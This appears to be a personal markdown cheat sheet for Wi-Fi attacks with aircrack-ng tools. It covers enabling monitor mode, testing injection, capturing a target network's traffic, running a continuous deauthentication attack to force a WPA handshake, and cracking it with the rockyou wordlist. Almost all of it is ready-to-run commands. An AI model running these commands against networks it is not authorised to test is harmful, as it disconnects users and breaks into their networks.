```markdown
# Wi-Fi Monitoring and Packet Injection

## Enabling Monitor Mode and Testing Packet Injection

To enable monitor mode and test packet injection, follow these steps:

```bash
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
iwconfig
sudo aireplay-ng --test wlan0
```

- **`sudo ifconfig wlan0 down`**: Bring down the wireless interface.
- **`sudo airmon-ng check kill`**: Check for processes that might interfere with monitor mode and kill them.
- **`sudo iwconfig wlan0 mode monitor`**: Set the wireless interface to monitor mode.
- **`sudo ifconfig wlan0 up`**: Bring up the wireless interface.
- **`iwconfig`**: Verify the wireless interface mode.

## Aircrack-ng Usage

To use Aircrack-ng for Wi-Fi hacking, execute the following commands:

```bash
iwconfig
sudo systemctl stop NetworkManager
sudo airmon-ng check kill #to kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w <filename>
```

1. **First Window**:
   - Make sure you replace the channel number and BSSID with your own.
   - Replace `hack1` with your desired filename, such as `capture1`.

```bash
sudo airodump-ng -w hack1 -c <channel> --bssid <BSSID> wlan0mon
```

2. **Second Window - Deauthentication Attack**:
   - Make sure you replace the BSSID with your own.

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

Once you have captured the necessary data, proceed with stopping monitor mode and cracking the captured handshake:

```bash
sudo airmon-ng stop wlan0mon
sudo aircrack-ng <filename>.cap -w /usr/share/wordlists/rockyou.txt
```
[[TL-WN722N_v2_Kali_Wireless_Setup]]
